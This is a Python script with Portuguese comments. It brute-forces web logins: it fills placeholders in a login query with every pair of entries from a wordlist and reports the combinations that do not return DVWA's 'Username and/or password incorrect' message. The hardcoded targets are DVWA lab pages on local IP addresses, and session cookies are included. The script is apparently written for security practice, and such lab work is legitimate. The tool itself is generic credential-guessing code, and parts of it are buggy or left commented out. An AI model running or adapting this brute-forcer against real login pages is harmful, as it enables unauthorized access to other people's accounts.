from bs4 import BeautifulSoup
import requests
import re
import sys
import getopt
import re

def obter_token(url, name_keyword="token"):
    try:
        # Fazendo a requisição GET para a URL
        response = requests.get(url)
        response.raise_for_status()  # Lança uma exceção para erros HTTP
        
        # Criando um objeto BeautifulSoup para analisar o conteúdo HTML da página
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Encontrando todos os elementos com o atributo 'name' que contenham a palavra-chave
        elements_with_name = soup.find_all(attrs={'name': re.compile(name_keyword)})
        
        # Verificando se algum elemento foi encontrado
        if elements_with_name:
            # Exibindo o valor dos elementos encontrados (se tiverem)
            for element in elements_with_name:
                # Verifica se o elemento possui o atributo 'value'
                if 'value' in element.attrs:
                    # print(f"Valor do elemento cujo nome contém '{name_keyword}': {element['value']}")
                    return element['value']
                else:
                    # print(f"O elemento cujo nome contém '{name_keyword}' não possui um atributo 'value'.")
                    return None
        else:
            print(f"Nenhum elemento cujo nome contenha '{name_keyword}' encontrado na página.")
    except requests.exceptions.RequestException as e:
        print("Erro ao fazer a requisição:", e)

def formatar_dicionario(string,separator):
    Post_body = {j[0]:j[1] for j in [i.split("=") for i in string.strip().split(separator)]}
    return Post_body

def send_post(url,body,validator,cookies=None):
    try:
        if cookies is not None:
            response = requests.post(url, data=body, cookies=cookies,allow_redirects=True)
        else:
            response = requests.post(url, data=body,allow_redirects=True)
        # if ""response.text
        print(response.status_code)
        print(response.text)
        for i,j in body:print(i,j)

    except Exception as e:
        print(e)

def http_post_handler():
    pass

def send_get(url,credential,validator,cookies=None):
    try:
        if cookies is not None:response = requests.get(url,allow_redirects=True,cookies=formatar_dicionario(cookies,";"))
        else: response = requests.get(url,allow_redirects=True)
        if validator not in response.text:
            print(response.status_code,credential)
    except Exception as e:
        print(e)

def http_get_handler(url,body,wordlist,validator,cookies=None):
    try: 
        cred1 = ''
        cred2 = ''
        cont = body.count("$")
        if cont >= 1:
            with open(wordlist,'r') as file:
                linhas = file.readlines()
                for linha in linhas:
                    cred1 = linha
                    body_to_send_1 = body.replace("$",linha.strip(),1)
                    if cont > 1:
                        with open(wordlist,'r') as file2:
                            linhas2 = file2.readlines()
                            for linha2 in linhas2:
                                cred2 = linha2
                                body_to_send_2 = body_to_send_1.replace("$",linha2.strip(),1)
                                string = url + body_to_send_2
                                send_get(string,[cred1,cred2],validator,cookies)
                            # send_get(string,[cred1,cred2],cookies)

        elif body.count("$") == 2:
            pass
        else:
            raise ValueError("O caractere '$' não foi encontrado no texto.")
    except Exception as e:
        print(e)

# def http_brute_force(url,body,type,cookies=None,wordlist='teste.txt'):
#     get_token = False
#     user_brute_force = False
#     get_token = False
#     password_brute_force = False
    
#     token = obter_token(url)
#     body = formatar_dicionario(body)
#     if cookies is not None:
#         cookies = formatar_dicionario(cookies,";")
#     if token is not None:
#         print(token)
#         get_token = True
#     print(f"token {token}")
#     print(f"cookies {cookies}")
    
#     if body.get('user') is '$USER':
#         user_brute_force = True
    
#     if body.get('password') is '$PASS':
#         password_brute_force = True

#     with open('r',wordlist) as file:
#         linhas = file.readlines()
#         for linha in linhas:
#             send_post(url,body,cookies)
#             if get_token is True: 
#                 token = obter_token(url)
#                 body.update({"user_token":token})

# try:
    # opts,args = getopt.getopt(sys[1:],'u:w:b:c:', ['--url=','--wordlist=','--body=','--cookies'])
    # cookies = None
    # # URL da página da web
    # for a,i in opts:
    #     if a in('-u','--url'):
    #         url = i
    #     elif a in ('-w','--wordlist'):
    #         wordlist = i
    #     elif a in ('-b','--body'):
    #         body = i
    #     elif a in ('-c','--cookies'):
    #         cookies = i
    #     else:
            # raise getopt.GetoptError("Argumentos inválidos")
url = "http://192.168.1.12/dvwa/login.php"
Post_body = "username=$USER&password=$PASS&Login=Login&user_token=$TOKEN"
cookies = "security=low; PHPSESSID=t4fi6mmsifo4g52knmhtdcole3"
        # Palavra-chave que você deseja encontrar no atributo "name"

        # Chamada da função para obter o valor do elemento pelo nome
        # if cookies is not None:
            # http_brute_force(url,Post_body,cookies)
# http_brute_force(url,Post_body)
# except:
#     print("Argumentos inválidos")

url = "http://192.168.1.13/dvwa/vulnerabilities/brute/"
get_body = "?username=$&password=$&Login=Login#"
cookies = "security=low; PHPSESSID=jkp318n6lq4gp89v92f46dshad"
wordlist = "teste.txt"
validator = "Username and/or password incorrect."
http_get_handler(url,get_body,wordlist,validator,cookies)